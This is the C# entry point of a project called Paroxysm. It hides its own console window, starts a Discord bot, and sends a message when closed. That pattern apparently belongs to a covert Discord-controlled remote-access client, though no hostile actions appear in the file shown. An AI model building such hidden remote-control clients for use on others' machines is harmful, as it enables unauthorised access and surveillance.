using Paroxysm.Discord;
using Paroxysm.Discord.Events;
using Paroxysm.Hooks.Actions;

namespace Paroxysm;

internal abstract class Program
{
    public static void Main(string[] args)
    {
        // Add application close handler
        OnBeforeCloseEvent.AppCloseHandler += OnBeforeCloseEvent.SendClosingMessage;
        OnBeforeCloseEvent.SetConsoleCtrlHandler(OnBeforeCloseEvent.AppCloseHandler, true);

        // Hide console
        ConsoleAction.Follow();

        // Initialize discord bot
        DiscordAPI.Init().GetAwaiter().GetResult();

        // Hold the console so it does’nt run off the end
        while (!OnBeforeCloseEvent.IsProgramExited)
        {
            Thread.Sleep(500);
        }
    }
}